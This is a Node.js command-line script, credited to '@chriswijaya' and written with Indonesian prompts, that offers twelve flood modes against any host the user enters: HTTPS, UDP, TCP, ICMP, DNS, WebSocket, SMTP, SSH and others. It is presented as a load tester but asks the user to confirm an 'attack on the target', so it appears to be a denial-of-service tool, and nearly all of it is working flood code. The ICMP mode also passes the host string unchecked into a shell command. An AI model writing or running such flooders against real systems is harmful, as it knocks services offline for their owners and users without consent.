const fetch = require("node-fetch");
const readline = require("readline");
const dgram = require("dgram");
const net = require("net");
const { exec } = require("child_process");
const tls = require("tls");
const http2 = require("http2");
const WebSocket = require("ws");
const dns = require("dns");

const colors = {
  reset: "\x1b[0m",
  red: "\x1b[31m",
  yellow: "\x1b[33m",
  green: "\x1b[32m"
};

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

function showBanner() {
  console.log(colors.red + `
  /$$$$$$  /$$                 /$$                 /$$$$$$$$                  /$$          
 /$$__  $$| $$                |__/                |__  $$__/                 | $$          
| $$  \\__/| $$$$$$$   /$$$$$$  /$$  /$$$$$$$         | $$  /$$$$$$   /$$$$$$ | $$  /$$$$$$$
| $$      | $$__  $$ /$$__  $$| $$ /$$_____/         | $$ /$$__  $$ /$$__  $$| $$ /$$_____/
| $$      | $$  \\ $$| $$  \\__/| $$|  $$$$$$          | $$| $$  \\ $$| $$  \\ $$| $$|  $$$$$$ 
| $$    $$| $$  | $$| $$      | $$ \\____  $$         | $$| $$  | $$| $$  | $$| $$ \\____  $$
|  $$$$$$/| $$  | $$| $$      | $$ /$$$$$$$/         | $$|  $$$$$$/|  $$$$$$/| $$ /$$$$$$$/
 \\______/ |__/  |__/|__/      |__/|_______/          |__/ \\______/  \\______/ |__/|_______/
` + colors.reset);
}

function showMenu() {
  console.log(colors.yellow + "\nPilih Mode Load Test:\n" + colors.reset);
  console.log(colors.yellow + "https     - HTTPS load test (https url,rps,durasi)" + colors.reset);
  console.log(colors.yellow + "udp       - UDP flood test (udp host,port,rps,durasi)" + colors.reset);
  console.log(colors.yellow + "tcp       - TCP flood test (tcp host,port,rps,durasi)" + colors.reset);
  console.log(colors.yellow + "icmp      - ICMP ping flood (icmp host,rps,durasi) [requires root]" + colors.reset);
  console.log(colors.yellow + "sctp      - SCTP flood test (sctp host,port,rps,durasi)" + colors.reset);
  console.log(colors.yellow + "http2     - HTTP/2 load test (http2 url,rps,durasi)" + colors.reset);
  console.log(colors.yellow + "http3     - HTTP/3 QUIC test (http3 url,rps,durasi)" + colors.reset);
  console.log(colors.yellow + "websocket - WebSocket flood (websocket url,rps,durasi)" + colors.reset);
  console.log(colors.yellow + "dns       - DNS query flood (dns host,domain,rps,durasi)" + colors.reset);
  console.log(colors.yellow + "ftp       - FTP connection flood (ftp host,port,rps,durasi)" + colors.reset);
  console.log(colors.yellow + "smtp      - SMTP connection flood (smtp host,port,rps,durasi)" + colors.reset);
  console.log(colors.yellow + "ssh       - SSH connection flood (ssh host,port,rps,durasi)" + colors.reset);
  console.log("");
}

showBanner();
showMenu();

rl.on("line", (input) => {
  const trimmed = input.trim();
  
  if (trimmed.startsWith("https ")) {
    handleHTTPS(trimmed);
  } else if (trimmed.startsWith("udp ")) {
    handleUDP(trimmed);
  } else if (trimmed.startsWith("tcp ")) {
    handleTCP(trimmed);
  } else if (trimmed.startsWith("icmp ")) {
    handleICMP(trimmed);
  } else if (trimmed.startsWith("sctp ")) {
    handleSCTP(trimmed);
  } else if (trimmed.startsWith("http2 ")) {
    handleHTTP2(trimmed);
  } else if (trimmed.startsWith("http3 ")) {
    handleHTTP3(trimmed);
  } else if (trimmed.startsWith("websocket ")) {
    handleWebSocket(trimmed);
  } else if (trimmed.startsWith("dns ")) {
    handleDNS(trimmed);
  } else if (trimmed.startsWith("ftp ")) {
    handleFTP(trimmed);
  } else if (trimmed.startsWith("smtp ")) {
    handleSMTP(trimmed);
  } else if (trimmed.startsWith("ssh ")) {
    handleSSH(trimmed);
  } else {
    console.log("format salah, pilih salah satu mode di atas");
  }
});

function handleHTTPS(input) {
  const params = input.substring(6).split(",");
  
  if (params.length !== 3) {
    console.log("format: https url,rps,durasi");
    return;
  }

  const url = params[0].trim();
  const rps = parseInt(params[1].trim());
  const durasi = parseInt(params[2].trim());

  if (isNaN(rps) || rps <= 0 || isNaN(durasi) || durasi <= 0) {
    console.log("rps dan durasi harus angka positif");
    return;
  }

  confirmAttack("https", url, rps, durasi, () => startHTTPSTest(url, rps, durasi));
}

function handleUDP(input) {
  const params = input.substring(4).split(",");
  
  if (params.length !== 4) {
    console.log("format: udp host,port,rps,durasi");
    return;
  }

  const host = params[0].trim();
  const port = parseInt(params[1].trim());
  const rps = parseInt(params[2].trim());
  const durasi = parseInt(params[3].trim());

  if (isNaN(port) || isNaN(rps) || rps <= 0 || isNaN(durasi) || durasi <= 0) {
    console.log("port, rps dan durasi harus angka positif");
    return;
  }

  confirmAttack("udp", host + ":" + port, rps, durasi, () => startUDPTest(host, port, rps, durasi));
}

function handleTCP(input) {
  const params = input.substring(4).split(",");
  
  if (params.length !== 4) {
    console.log("format: tcp host,port,rps,durasi");
    return;
  }

  const host = params[0].trim();
  const port = parseInt(params[1].trim());
  const rps = parseInt(params[2].trim());
  const durasi = parseInt(params[3].trim());

  if (isNaN(port) || isNaN(rps) || rps <= 0 || isNaN(durasi) || durasi <= 0) {
    console.log("port, rps dan durasi harus angka positif");
    return;
  }

  confirmAttack("tcp", host + ":" + port, rps, durasi, () => startTCPTest(host, port, rps, durasi));
}

function handleICMP(input) {
  const params = input.substring(5).split(",");
  
  if (params.length !== 3) {
    console.log("format: icmp host,rps,durasi");
    return;
  }

  const host = params[0].trim();
  const rps = parseInt(params[1].trim());
  const durasi = parseInt(params[2].trim());

  if (isNaN(rps) || rps <= 0 || isNaN(durasi) || durasi <= 0) {
    console.log("rps dan durasi harus angka positif");
    return;
  }

  confirmAttack("icmp", host, rps, durasi, () => startICMPTest(host, rps, durasi));
}

function handleSCTP(input) {
  const params = input.substring(5).split(",");
  
  if (params.length !== 4) {
    console.log("format: sctp host,port,rps,durasi");
    return;
  }

  const host = params[0].trim();
  const port = parseInt(params[1].trim());
  const rps = parseInt(params[2].trim());
  const durasi = parseInt(params[3].trim());

  if (isNaN(port) || isNaN(rps) || rps <= 0 || isNaN(durasi) || durasi <= 0) {
    console.log("port, rps dan durasi harus angka positif");
    return;
  }

  confirmAttack("sctp", host + ":" + port, rps, durasi, () => startSCTPTest(host, port, rps, durasi));
}

function handleHTTP2(input) {
  const params = input.substring(6).split(",");
  
  if (params.length !== 3) {
    console.log("format: http2 url,rps,durasi");
    return;
  }

  const url = params[0].trim();
  const rps = parseInt(params[1].trim());
  const durasi = parseInt(params[2].trim());

  if (isNaN(rps) || rps <= 0 || isNaN(durasi) || durasi <= 0) {
    console.log("rps dan durasi harus angka positif");
    return;
  }

  confirmAttack("http2", url, rps, durasi, () => startHTTP2Test(url, rps, durasi));
}

function handleHTTP3(input) {
  const params = input.substring(6).split(",");
  
  if (params.length !== 3) {
    console.log("format: http3 url,rps,durasi");
    return;
  }

  const url = params[0].trim();
  const rps = parseInt(params[1].trim());
  const durasi = parseInt(params[2].trim());

  if (isNaN(rps) || rps <= 0 || isNaN(durasi) || durasi <= 0) {
    console.log("rps dan durasi harus angka positif");
    return;
  }

  confirmAttack("http3", url, rps, durasi, () => startHTTP3Test(url, rps, durasi));
}

function handleWebSocket(input) {
  const params = input.substring(10).split(",");
  
  if (params.length !== 3) {
    console.log("format: websocket url,rps,durasi");
    return;
  }

  const url = params[0].trim();
  const rps = parseInt(params[1].trim());
  const durasi = parseInt(params[2].trim());

  if (isNaN(rps) || rps <= 0 || isNaN(durasi) || durasi <= 0) {
    console.log("rps dan durasi harus angka positif");
    return;
  }

  confirmAttack("websocket", url, rps, durasi, () => startWebSocketTest(url, rps, durasi));
}

function handleDNS(input) {
  const params = input.substring(4).split(",");
  
  if (params.length !== 4) {
    console.log("format: dns host,domain,rps,durasi");
    return;
  }

  const host = params[0].trim();
  const domain = params[1].trim();
  const rps = parseInt(params[2].trim());
  const durasi = parseInt(params[3].trim());

  if (isNaN(rps) || rps <= 0 || isNaN(durasi) || durasi <= 0) {
    console.log("rps dan durasi harus angka positif");
    return;
  }

  confirmAttack("dns", host + " | domain: " + domain, rps, durasi, () => startDNSTest(host, domain, rps, durasi));
}

function handleFTP(input) {
  const params = input.substring(4).split(",");
  
  if (params.length !== 4) {
    console.log("format: ftp host,port,rps,durasi");
    return;
  }

  const host = params[0].trim();
  const port = parseInt(params[1].trim());
  const rps = parseInt(params[2].trim());
  const durasi = parseInt(params[3].trim());

  if (isNaN(port) || isNaN(rps) || rps <= 0 || isNaN(durasi) || durasi <= 0) {
    console.log("port, rps dan durasi harus angka positif");
    return;
  }

  confirmAttack("ftp", host + ":" + port, rps, durasi, () => startFTPTest(host, port, rps, durasi));
}

function handleSMTP(input) {
  const params = input.substring(5).split(",");
  
  if (params.length !== 4) {
    console.log("format: smtp host,port,rps,durasi");
    return;
  }

  const host = params[0].trim();
  const port = parseInt(params[1].trim());
  const rps = parseInt(params[2].trim());
  const durasi = parseInt(params[3].trim());

  if (isNaN(port) || isNaN(rps) || rps <= 0 || isNaN(durasi) || durasi <= 0) {
    console.log("port, rps dan durasi harus angka positif");
    return;
  }

  confirmAttack("smtp", host + ":" + port, rps, durasi, () => startSMTPTest(host, port, rps, durasi));
}

function handleSSH(input) {
  const params = input.substring(4).split(",");
  
  if (params.length !== 4) {
    console.log("format: ssh host,port,rps,durasi");
    return;
  }

  const host = params[0].trim();
  const port = parseInt(params[1].trim());
  const rps = parseInt(params[2].trim());
  const durasi = parseInt(params[3].trim());

  if (isNaN(port) || isNaN(rps) || rps <= 0 || isNaN(durasi) || durasi <= 0) {
    console.log("port, rps dan durasi harus angka positif");
    return;
  }

  confirmAttack("ssh", host + ":" + port, rps, durasi, () => startSSHTest(host, port, rps, durasi));
}

function confirmAttack(type, target, rps, durasi, callback) {
  rl.close();
  
  const confirmRl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  console.log("\ndo u sure to attack the target?");
  console.log("target: " + target);
  console.log("type: " + type);
  console.log("rps: " + rps);
  console.log("duration: " + durasi + " seconds");
  console.log("\ntype yes if u sure, type no to cancel");

  confirmRl.on("line", (answer) => {
    const trimmed = answer.trim().toLowerCase();
    
    if (trimmed === "yes") {
      confirmRl.close();
      callback();
    } else if (trimmed === "no") {
      console.log("\nattack cancelled");
      confirmRl.close();
      process.exit(0);
    } else {
      console.log("invalid input, type yes or no");
    }
  });
}

function startHTTPSTest(url, rps, durasi) {
  let totalRequest = 0;
  let sukses = 0;
  let gagal = 0;
  let waktuMulai = Date.now();

  console.log(colors.green + "\nhttps target : " + url + colors.reset);

  const interval = setInterval(() => {
    totalRequest++;

    fetch(url)
      .then(res => {
        sukses++;
      })
      .catch(err => {
        gagal++;
      });
  }, 1000 / rps);

  const displayInterval = setInterval(() => {
    const waktuBerlalu = Math.floor((Date.now() - waktuMulai) / 1000);
    const sisaWaktu = durasi - waktuBerlalu;
    
    process.stdout.write(colors.green + "\rsedang mengirim " + totalRequest + " request | sisa waktu " + sisaWaktu + " detik   " + colors.reset);
  }, 100);

  setTimeout(() => {
    clearInterval(interval);
    clearInterval(displayInterval);
    
    setTimeout(() => {
      showBanner();
      console.log("\nhttps target : " + url);
      console.log("request terkirim : " + sukses);
      console.log("request gagal : " + gagal);
      console.log("script by @chriswijaya\n");
      
      process.exit(0);
    }, 2000);
  }, durasi * 1000);
}

function startUDPTest(host, port, rps, durasi) {
  let totalPacket = 0;
  let sukses = 0;
  let gagal = 0;
  let waktuMulai = Date.now();

  console.log(colors.green + "\nudp target : " + host + ":" + port + colors.reset);

  const message = Buffer.from("UDP_FLOOD_TEST_" + Date.now());

  const interval = setInterval(() => {
    totalPacket++;
    const client = dgram.createSocket("udp4");

    client.send(message, port, host, (err) => {
      if (err) {
        gagal++;
      } else {
        sukses++;
      }
      client.close();
    });
  }, 1000 / rps);

  const displayInterval = setInterval(() => {
    const waktuBerlalu = Math.floor((Date.now() - waktuMulai) / 1000);
    const sisaWaktu = durasi - waktuBerlalu;
    
    process.stdout.write(colors.green + "\rsedang mengirim " + totalPacket + " packet | sisa waktu " + sisaWaktu + " detik   " + colors.reset);
  }, 100);

  setTimeout(() => {
    clearInterval(interval);
    clearInterval(displayInterval);
    
    setTimeout(() => {
      showBanner();
      console.log("\nudp target : " + host + ":" + port);
      console.log("packet terkirim : " + sukses);
      console.log("packet gagal : " + gagal);
      console.log("script by @chriswijaya\n");
      
      process.exit(0);
    }, 2000);
  }, durasi * 1000);
}

function startTCPTest(host, port, rps, durasi) {
  let totalConnection = 0;
  let sukses = 0;
  let gagal = 0;
  let waktuMulai = Date.now();

  console.log(colors.green + "\ntcp target : " + host + ":" + port + colors.reset);

  const interval = setInterval(() => {
    totalConnection++;
    const client = new net.Socket();

    client.setTimeout(5000);

    client.connect(port, host, () => {
      sukses++;
      client.write("TCP_FLOOD_" + Date.now());
      client.destroy();
    });

    client.on("error", (err) => {
      gagal++;
      client.destroy();
    });

    client.on("timeout", () => {
      gagal++;
      client.destroy();
    });
  }, 1000 / rps);

  const displayInterval = setInterval(() => {
    const waktuBerlalu = Math.floor((Date.now() - waktuMulai) / 1000);
    const sisaWaktu = durasi - waktuBerlalu;
    
    process.stdout.write(colors.green + "\rsedang mengirim " + totalConnection + " connection | sisa waktu " + sisaWaktu + " detik   " + colors.reset);
  }, 100);

  setTimeout(() => {
    clearInterval(interval);
    clearInterval(displayInterval);
    
    setTimeout(() => {
      showBanner();
      console.log("\ntcp target : " + host + ":" + port);
      console.log("connection terkirim : " + sukses);
      console.log("connection gagal : " + gagal);
      console.log("script by @chriswijaya\n");
      
      process.exit(0);
    }, 2000);
  }, durasi * 1000);
}

function startICMPTest(host, rps, durasi) {
  let totalPing = 0;
  let sukses = 0;
  let gagal = 0;
  let waktuMulai = Date.now();

  console.log(colors.green + "\nicmp target : " + host + colors.reset);

  const interval = setInterval(() => {
    totalPing++;

    exec(`ping -c 1 -W 1 ${host}`, (error, stdout, stderr) => {
      if (error) {
        gagal++;
      } else {
        sukses++;
      }
    });
  }, 1000 / rps);

  const displayInterval = setInterval(() => {
    const waktuBerlalu = Math.floor((Date.now() - waktuMulai) / 1000);
    const sisaWaktu = durasi - waktuBerlalu;
    
    process.stdout.write(colors.green + "\rsedang mengirim " + totalPing + " ping | sisa waktu " + sisaWaktu + " detik   " + colors.reset);
  }, 100);

  setTimeout(() => {
    clearInterval(interval);
    clearInterval(displayInterval);
    
    setTimeout(() => {
      showBanner();
      console.log("\nicmp target : " + host);
      console.log("ping terkirim : " + sukses);
      console.log("ping gagal : " + gagal);
      console.log("script by @chriswijaya\n");
      
      process.exit(0);
    }, 2000);
  }, durasi * 1000);
}

function startSCTPTest(host, port, rps, durasi) {
  let totalConnection = 0;
  let sukses = 0;
  let gagal = 0;
  let waktuMulai = Date.now();

  console.log(colors.green + "\nsctp target : " + host + ":" + port + colors.reset);
  console.log("note: SCTP requires kernel support and special libraries");

  const interval = setInterval(() => {
    totalConnection++;
    const client = new net.Socket();
    client.setTimeout(5000);

    client.connect(port, host, () => {
      sukses++;
      client.destroy();
    });

    client.on("error", (err) => {
      gagal++;
      client.destroy();
    });

    client.on("timeout", () => {
      gagal++;
      client.destroy();
    });
  }, 1000 / rps);

  const displayInterval = setInterval(() => {
    const waktuBerlalu = Math.floor((Date.now() - waktuMulai) / 1000);
    const sisaWaktu = durasi - waktuBerlalu;
    
    process.stdout.write(colors.green + "\rsedang mengirim " + totalConnection + " connection | sisa waktu " + sisaWaktu + " detik   " + colors.reset);
  }, 100);

  setTimeout(() => {
    clearInterval(interval);
    clearInterval(displayInterval);
    
    setTimeout(() => {
      showBanner();
      console.log("\nsctp target : " + host + ":" + port);
      console.log("connection terkirim : " + sukses);
      console.log("connection gagal : " + gagal);
      console.log("script by @chriswijaya\n");
      
      process.exit(0);
    }, 2000);
  }, durasi * 1000);
}

function startHTTP2Test(url, rps, durasi) {
  let totalRequest = 0;
  let sukses = 0;
  let gagal = 0;
  let waktuMulai = Date.now();

  console.log(colors.green + "\nhttp2 target : " + url + colors.reset);

  const urlObj = new URL(url);
  
  const interval = setInterval(() => {
    totalRequest++;

    const client = http2.connect(urlObj.origin);
    
    const req = client.request({
      ":path": urlObj.pathname
    });

    req.on("response", (headers) => {
      sukses++;
    });

    req.on("error", (err) => {
      gagal++;
    });

    req.end();

    setTimeout(() => {
      client.close();
    }, 1000);
  }, 1000 / rps);

  const displayInterval = setInterval(() => {
    const waktuBerlalu = Math.floor((Date.now() - waktuMulai) / 1000);
    const sisaWaktu = durasi - waktuBerlalu;
    
    process.stdout.write(colors.green + "\rsedang mengirim " + totalRequest + " request | sisa waktu " + sisaWaktu + " detik   " + colors.reset);
  }, 100);

  setTimeout(() => {
    clearInterval(interval);
    clearInterval(displayInterval);
    
    setTimeout(() => {
      showBanner();
      console.log("\nhttp2 target : " + url);
      console.log("request terkirim : " + sukses);
      console.log("request gagal : " + gagal);
      console.log("script by @chriswijaya\n");
      
      process.exit(0);
    }, 2000);
  }, durasi * 1000);
}

function startHTTP3Test(url, rps, durasi) {
  let totalRequest = 0;
  let sukses = 0;
  let gagal = 0;
  let waktuMulai = Date.now();

  console.log(colors.green + "\nhttp3 target : " + url + colors.reset);
  console.log("note: HTTP/3 requires special library support, falling back to HTTPS");

  const interval = setInterval(() => {
    totalRequest++;

    fetch(url)
      .then(res => {
        sukses++;
      })
      .catch(err => {
        gagal++;
      });
  }, 1000 / rps);

  const displayInterval = setInterval(() => {
    const waktuBerlalu = Math.floor((Date.now() - waktuMulai) / 1000);
    const sisaWaktu = durasi - waktuBerlalu;
    
    process.stdout.write(colors.green + "\rsedang mengirim " + totalRequest + " request | sisa waktu " + sisaWaktu + " detik   " + colors.reset);
  }, 100);

  setTimeout(() => {
    clearInterval(interval);
    clearInterval(displayInterval);
    
    setTimeout(() => {
      showBanner();
      console.log("\nhttp3 target : " + url);
      console.log("request terkirim : " + sukses);
      console.log("request gagal : " + gagal);
      console.log("script by @chriswijaya\n");
      
      process.exit(0);
    }, 2000);
  }, durasi * 1000);
}

function startWebSocketTest(url, rps, durasi) {
  let totalConnection = 0;
  let sukses = 0;
  let gagal = 0;
  let waktuMulai = Date.now();

  console.log(colors.green + "\nwebsocket target : " + url + colors.reset);

  const interval = setInterval(() => {
    totalConnection++;

    try {
      const ws = new WebSocket(url);

      ws.on("open", () => {
        sukses++;
        ws.send("WS_TEST_" + Date.now());
        ws.close();
      });

      ws.on("error", (err) => {
        gagal++;
      });
    } catch (err) {
      gagal++;
    }
  }, 1000 / rps);

  const displayInterval = setInterval(() => {
    const waktuBerlalu = Math.floor((Date.now() - waktuMulai) / 1000);
    const sisaWaktu = durasi - waktuBerlalu;
    
    process.stdout.write(colors.green + "\rsedang mengirim " + totalConnection + " connection | sisa waktu " + sisaWaktu + " detik   " + colors.reset);
  }, 100);

  setTimeout(() => {
    clearInterval(interval);
    clearInterval(displayInterval);
    
    setTimeout(() => {
      showBanner();
      console.log("\nwebsocket target : " + url);
      console.log("connection terkirim : " + sukses);
      console.log("connection gagal : " + gagal);
      console.log("script by @chriswijaya\n");
      
      process.exit(0);
    }, 2000);
  }, durasi * 1000);
}

function startDNSTest(host, domain, rps, durasi) {
  let totalQuery = 0;
  let sukses = 0;
  let gagal = 0;
  let waktuMulai = Date.now();

  console.log(colors.green + "\ndns target : " + host + " | domain : " + domain + colors.reset);

  dns.setServers([host]);

  const interval = setInterval(() => {
    totalQuery++;

    dns.resolve4(domain, (err, addresses) => {
      if (err) {
        gagal++;
      } else {
        sukses++;
      }
    });
  }, 1000 / rps);

  const displayInterval = setInterval(() => {
    const waktuBerlalu = Math.floor((Date.now() - waktuMulai) / 1000);
    const sisaWaktu = durasi - waktuBerlalu;
    
    process.stdout.write(colors.green + "\rsedang mengirim " + totalQuery + " query | sisa waktu " + sisaWaktu + " detik   " + colors.reset);
  }, 100);

  setTimeout(() => {
    clearInterval(interval);
    clearInterval(displayInterval);
    
    setTimeout(() => {
      showBanner();
      console.log("\ndns target : " + host + " | domain : " + domain);
      console.log("query terkirim : " + sukses);
      console.log("query gagal : " + gagal);
      console.log("script by @chriswijaya\n");
      
      process.exit(0);
    }, 2000);
  }, durasi * 1000);
}

function startFTPTest(host, port, rps, durasi) {
  let totalConnection = 0;
  let sukses = 0;
  let gagal = 0;
  let waktuMulai = Date.now();

  console.log(colors.green + "\nftp target : " + host + ":" + port + colors.reset);

  const interval = setInterval(() => {
    totalConnection++;
    const client = new net.Socket();
    client.setTimeout(5000);

    client.connect(port, host, () => {
      sukses++;
      client.write("USER anonymous\r\n");
      client.destroy();
    });

    client.on("error", (err) => {
      gagal++;
      client.destroy();
    });

    client.on("timeout", () => {
      gagal++;
      client.destroy();
    });
  }, 1000 / rps);

  const displayInterval = setInterval(() => {
    const waktuBerlalu = Math.floor((Date.now() - waktuMulai) / 1000);
    const sisaWaktu = durasi - waktuBerlalu;
    
    process.stdout.write(colors.green + "\rsedang mengirim " + totalConnection + " connection | sisa waktu " + sisaWaktu + " detik   " + colors.reset);
  }, 100);

  setTimeout(() => {
    clearInterval(interval);
    clearInterval(displayInterval);
    
    setTimeout(() => {
      showBanner();
      console.log("\nftp target : " + host + ":" + port);
      console.log("connection terkirim : " + sukses);
      console.log("connection gagal : " + gagal);
      console.log("script by @chriswijaya\n");
      
      process.exit(0);
    }, 2000);
  }, durasi * 1000);
}

function startSMTPTest(host, port, rps, durasi) {
  let totalConnection = 0;
  let sukses = 0;
  let gagal = 0;
  let waktuMulai = Date.now();

  console.log(colors.green + "\nsmtp target : " + host + ":" + port + colors.reset);

  const interval = setInterval(() => {
    totalConnection++;
    const client = new net.Socket();
    client.setTimeout(5000);

    client.connect(port, host, () => {
      sukses++;
      client.write("HELO test\r\n");
      client.destroy();
    });

    client.on("error", (err) => {
      gagal++;
      client.destroy();
    });

    client.on("timeout", () => {
      gagal++;
      client.destroy();
    });
  }, 1000 / rps);

  const displayInterval = setInterval(() => {
    const waktuBerlalu = Math.floor((Date.now() - waktuMulai) / 1000);
    const sisaWaktu = durasi - waktuBerlalu;
    
    process.stdout.write(colors.green + "\rsedang mengirim " + totalConnection + " connection | sisa waktu " + sisaWaktu + " detik   " + colors.reset);
  }, 100);

  setTimeout(() => {
    clearInterval(interval);
    clearInterval(displayInterval);
    
    setTimeout(() => {
      showBanner();
      console.log("\nsmtp target : " + host + ":" + port);
      console.log("connection terkirim : " + sukses);
      console.log("connection gagal : " + gagal);
      console.log("script by @chriswijaya\n");
      
      process.exit(0);
    }, 2000);
  }, durasi * 1000);
}

function startSSHTest(host, port, rps, durasi) {
  let totalConnection = 0;
  let sukses = 0;
  let gagal = 0;
  let waktuMulai = Date.now();

  console.log(colors.green + "\nssh target : " + host + ":" + port + colors.reset);

  const interval = setInterval(() => {
    totalConnection++;
    const client = new net.Socket();
    client.setTimeout(5000);

    client.connect(port, host, () => {
      sukses++;
      client.destroy();
    });

    client.on("error", (err) => {
      gagal++;
      client.destroy();
    });

    client.on("timeout", () => {
      gagal++;
      client.destroy();
    });
  }, 1000 / rps);

  const displayInterval = setInterval(() => {
    const waktuBerlalu = Math.floor((Date.now() - waktuMulai) / 1000);
    const sisaWaktu = durasi - waktuBerlalu;
    
    process.stdout.write(colors.green + "\rsedang mengirim " + totalConnection + " connection | sisa waktu " + sisaWaktu + " detik   " + colors.reset);
  }, 100);

  setTimeout(() => {
    clearInterval(interval);
    clearInterval(displayInterval);
    
    setTimeout(() => {
      showBanner();
      console.log("\nssh target : " + host + ":" + port);
      console.log("connection terkirim : " + sukses);
      console.log("connection gagal : " + gagal);
      console.log("script by @chriswijaya\n");
      
      process.exit(0);
    }, 2000);
  }, durasi * 1000);
}

